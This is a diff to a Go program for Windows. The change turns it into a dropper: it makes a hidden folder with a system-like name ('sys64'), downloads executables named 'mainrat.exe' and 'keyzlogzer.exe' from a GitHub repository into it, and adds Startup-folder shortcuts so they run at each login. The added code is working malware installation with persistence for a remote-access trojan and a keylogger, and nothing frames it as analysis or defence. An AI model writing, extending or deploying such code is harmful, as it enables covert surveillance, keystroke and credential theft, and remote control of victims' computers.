@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -15,7 +17,7 @@ var (
 	shGetFolderPathA = shell32.NewProc("SHGetFolderPathA")
 )
 
-// Make hidden folder
+// Create hidden folder
 func MakeHiddenFolder(path string) error {
 	err := os.MkdirAll(path, 0700)
 	if err != nil {
@@ -24,7 +26,7 @@ func MakeHiddenFolder(path string) error {
 	return syscall.SetFileAttributes(syscall.StringToUTF16Ptr(path), syscall.FILE_ATTRIBUTE_HIDDEN)
 }
 
-// Copy file to destination path
+// Copy file
 func CopyFile(sourcePath, destPath string) error {
 	src, err := os.Open(sourcePath)
 	if err != nil {
@@ -53,7 +55,7 @@ func GetStartupFolder() (string, error) {
 	return string(path[:strings.IndexByte(string(path[:]), 0)]), nil
 }
 
-// Create shortcut using PowerShell
+// Create shortcut to file in startup
 func CreateShortcutToStartup(targetPath, shortcutName string) error {
 	startupFolder, err := GetStartupFolder()
 	if err != nil {
@@ -66,42 +68,71 @@ func CreateShortcutToStartup(targetPath, shortcutName string) error {
 	return cmd.Run()
 }
 
-func main() {
-	currentDir, err := os.Getwd()
-	if err != nil {
-		fmt.Println("Failed to get current dir:", err)
-		return
+// Download file to given destination dir
+func DownloadFile(fileURL, destinationDir string) (string, error) {
+	// Make sure directory exists
+	if _, err := os.Stat(destinationDir); os.IsNotExist(err) {
+		os.MkdirAll(destinationDir, 0755)
 	}
 
+	// Get filename
+	fileName := filepath.Base(fileURL)
+	if !strings.Contains(fileName, ".") {
+		fileName += ".bin"
+	}
+
+	// Final path
+	filePath := filepath.Join(destinationDir, fileName)
+
+	// Download
+	resp, err := http.Get(fileURL)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	out, err := os.Create(filePath)
+	if err != nil {
+		return "", err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	return filePath, nil
+}
+
+func main() {
+	// Step 1: Create hidden folder
 	targetFolder := `C:\fake\LINA\Desktop\games\sys64`
 	if err := MakeHiddenFolder(targetFolder); err != nil {
 		fmt.Println("Failed to create hidden folder:", err)
 		return
 	}
 
-	// Copy text files
-	textFiles := []string{"hello.txt", "hello2.txt"}
-	for _, file := range textFiles {
-		src := filepath.Join(currentDir, file)
-		dest := filepath.Join(targetFolder, file)
-		if err := CopyFile(src, dest); err != nil {
-			fmt.Println("Failed to copy", file, ":", err)
+	// Step 2: Download files to that folder
+	urls := []string{
+		"https://github.com/NobelTad/test/raw/refs/heads/main/mainrat.exe",
+		"https://github.com/NobelTad/test/raw/refs/heads/main/keyzlogzer.exe",
+	}
+	for _, url := range urls {
+		fmt.Println("Downloading:", url)
+		filePath, err := DownloadFile(url, targetFolder)
+		if err != nil {
+			fmt.Println("Failed to download:", err)
+			continue
+		}
+		fmt.Println("Saved to:", filePath)
+
+		// Step 3: Create shortcut in Startup
+		name := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
+		if err := CreateShortcutToStartup(filePath, name); err != nil {
+			fmt.Println("Failed to create startup shortcut for", filePath, ":", err)
 		}
 	}
 
-	// Rename main.exe to nobelrun.exe in target folder
-	mainSrc := filepath.Join(currentDir, "main.exe")
-	nobelDest := filepath.Join(targetFolder, "nobelrun.exe")
-	if err := CopyFile(mainSrc, nobelDest); err != nil {
-		fmt.Println("Failed to copy/rename main.exe:", err)
-		return
-	}
-
-	// Create shortcut
-	if err := CreateShortcutToStartup(nobelDest, "nobelrunner"); err != nil {
-		fmt.Println("Failed to create startup shortcut:", err)
-		return
-	}
-
-	fmt.Println("Done.")
+	fmt.Println("All done.")
 }
